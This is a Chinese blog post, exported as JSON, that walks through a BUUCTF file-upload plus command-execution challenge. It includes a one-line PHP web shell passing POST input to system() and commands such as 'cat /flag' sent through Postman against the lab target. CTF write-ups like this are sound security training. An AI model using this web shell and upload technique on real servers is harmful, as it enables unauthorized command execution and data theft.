{"title":"BUU-UPLOAD联合RCE","uid":"c1f68926e47c7ff28424379bdd26999e","slug":"BUU-UPLOAD联合RCE","date":"2022-03-18T09:32:48.000Z","updated":"2022-03-20T11:49:23.232Z","comments":true,"path":"api/articles/BUU-UPLOAD联合RCE.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>BUU一道文件上传联合RCE的一道题。</p>\n<h2 id=\"0x00-启动靶场\"><a href=\"#0x00-启动靶场\" class=\"headerlink\" title=\"0x00 启动靶场\"></a>0x00 启动靶场</h2><p>启动靶场提示上传文件，随便上传一个1.php文件，写入一句话，发现并没有做限制，可以任意文件上传，但上传之后会将文件名和后缀名修改为xxx.jpg的格式。</p>\n<p><img src=\"/post/BUU-UPLOAD%E8%81%94%E5%90%88RCE.htm/image-20220318173443517.png\" alt=\"image-20220318173443517\"></p>\n<p><img src=\"/post/BUU-UPLOAD%E8%81%94%E5%90%88RCE.htm/image-20220318173527061.png\" alt=\"image-20220318173527061\"></p>\n<p>看到回显的路径。</p>\n<p>试着访问，是空白页面，不知道是否能被执行。<br><img src=\"/post/BUU-UPLOAD%E8%81%94%E5%90%88RCE.htm/image-20220318173623676.png\" alt=\"image-20220318173623676\"></p>\n<p>上传一个2.php，里面写入<code>Hello World!</code>看看效果</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php echo &#39;Hello World!&#39;; ?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/BUU-UPLOAD%E8%81%94%E5%90%88RCE.htm/image-20220318173847728.png\" alt=\"image-20220318173847728\"></p>\n<p>可以看到文件被执行成功了，那么1.php也可以被执行成功。</p>\n<p><strong>（我们上传之后 不能直接访问xxx&#x2F;uploads&#x2F;xxxxx.jpg 那样只是预览这个文件 而起不到调用这个文件的作用）</strong></p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>但是使用蚁剑链接后可以连接成功，但是不能连接到文件目录</p>\n<p><img src=\"/post/BUU-UPLOAD%E8%81%94%E5%90%88RCE.htm/image-20220318174008101.png\" alt=\"image-20220318174008101\"></p>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>最后翻了几篇帖子，发现需要和RCE漏洞一起执行。</p>\n<p>首先需要将一句话木马修改一下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php @eval(system($_POST[&quot;x&quot;]));?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>注：</strong>这里使用<code>system()</code>函数的原因：（这也是为什么会联合RCE一起的原因）</p>\n<p><img src=\"/post/BUU-UPLOAD%E8%81%94%E5%90%88RCE.htm/image-20220318174359421.png\" alt=\"image-20220318174359421\"></p>\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p>最后将修改的1.php文件上传并访问（这里同样访问后是空白），但经过上面的测试可以知道上传的文件已经被执行成功。</p>\n<p><img src=\"/post/BUU-UPLOAD%E8%81%94%E5%90%88RCE.htm/image-20220318174629288.png\" alt=\"image-20220318174629288\"></p>\n<h2 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h2><p>接着将url放入到Postman中访问，并把Body的值修改为<code>x:ls /</code>，可以得到网站目录</p>\n<p><img src=\"/post/BUU-UPLOAD%E8%81%94%E5%90%88RCE.htm/image-20220318174901586.png\" alt=\"image-20220318174901586\"></p>\n<p>再修改为<code>x:cat /flag</code>，得到flag</p>\n<p><img src=\"/post/BUU-UPLOAD%E8%81%94%E5%90%88RCE.htm/image-20220318175147535.png\" alt=\"image-20220318175147535\"></p>\n<h2 id=\"0x06-总结\"><a href=\"#0x06-总结\" class=\"headerlink\" title=\"0x06 总结\"></a>0x06 总结</h2><p>这道题最主要的就是要知道虽然可以进行任意文件上传，但上传后的文件名和后缀名都被会重新修改，导致菜刀或者蚁剑可以连接成功，但不能够访问网站目录；其次就是要知道直接访问xxx.jpg文件只是去预览这个文件，而不是去调用这个文件，导致一句话不能被执行而失去作用，这个时候使用工Postman修改Body中参数，加入命令找到flag。</p>\n","text":"前言BUU一道文件上传联合RCE的一道题。 0x00 启动靶场启动靶场提示上传文件，随便上传一个1.php文件，写入一句话，发现并没有做限制，可以任意文件上传，但上传之后会将文件名和后缀名修改为xxx.jpg的格式。 看到回显的路径。 试着访问，是空白页面，不知道是否能被执行。 ...","link":"","photos":[],"count_time":{"symbolsCount":802,"symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":10,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":19,"path":"api/tags/CTF.json"},{"name":"RCE","slug":"RCE","count":4,"path":"api/tags/RCE.json"},{"name":"文件上传","slug":"文件上传","count":7,"path":"api/tags/文件上传.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00-%E5%90%AF%E5%8A%A8%E9%9D%B6%E5%9C%BA\"><span class=\"toc-text\">0x00 启动靶场</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05\"><span class=\"toc-text\">0x05</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x06-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">0x06 总结</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUU-Crypto-看我回旋踢","uid":"5e40bb5a83b8a3c2081bbb8071845ea4","slug":"BUU-Crypto-看我回旋踢","date":"2022-03-19T14:10:12.000Z","updated":"2022-03-20T11:48:42.767Z","comments":true,"path":"api/articles/BUU-Crypto-看我回旋踢.json","keywords":null,"cover":[],"text":"前言记一次BUU密码学的CTF题目：看我回旋踢。不是很擅长密码学这一个方向，简单记录一下，毕竟计算机最后都不分家嘛。 0x00 启动靶场启动靶场下载压缩包，解压得到一串字符串 0x01synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#...","link":"","photos":[],"count_time":{"symbolsCount":603,"symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":10,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":19,"path":"api/tags/CTF.json"},{"name":"Crypto","slug":"Crypto","count":1,"path":"api/tags/Crypto.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"BUU-BURP-X-Real-IP","uid":"eefdee94a2ec4b5d372ab4adce8d3bac","slug":"BUU-BURP-X-Real-IP","date":"2022-03-18T08:10:44.000Z","updated":"2022-03-20T11:48:28.751Z","comments":true,"path":"api/articles/BUU-BURP-X-Real-IP.json","keywords":null,"cover":[],"text":"前言BUU一道BURP的题目，并记录一下X-Forwarded-For和X-Real-IP的区别。 0x00 启动靶场看到只能本地访问，一般看到这句话的时候肯定首先想到的是X-Forwarded-For，但是数据包中加了X-Forwarded-For也没什么作用，翻了几篇帖子看到...","link":"","photos":[],"count_time":{"symbolsCount":512,"symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":10,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":19,"path":"api/tags/CTF.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}